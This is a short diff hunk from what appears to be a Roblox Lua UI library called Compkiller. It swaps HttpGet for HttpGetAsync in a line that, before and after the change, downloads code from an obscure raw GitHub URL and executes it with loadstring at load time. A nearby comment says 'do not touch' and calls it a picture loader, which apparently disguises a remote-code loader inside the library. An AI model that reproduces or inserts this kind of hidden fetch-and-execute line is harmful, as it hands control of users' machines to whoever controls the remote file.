@@ -10642,6 +10642,6 @@ EXTENSION DO NOT TOUCH, ITS FOR THE PICTURE LOADER
 
 Compkiller:SetTheme("Purple Rose")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f345bb35a3e4323c3fb6ad2f8b7e0122f701f85/icek/refs/heads/main/picture"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/f345bb35a3e4323c3fb6ad2f8b7e0122f701f85/icek/refs/heads/main/picture"))()
 
 return Compkiller;
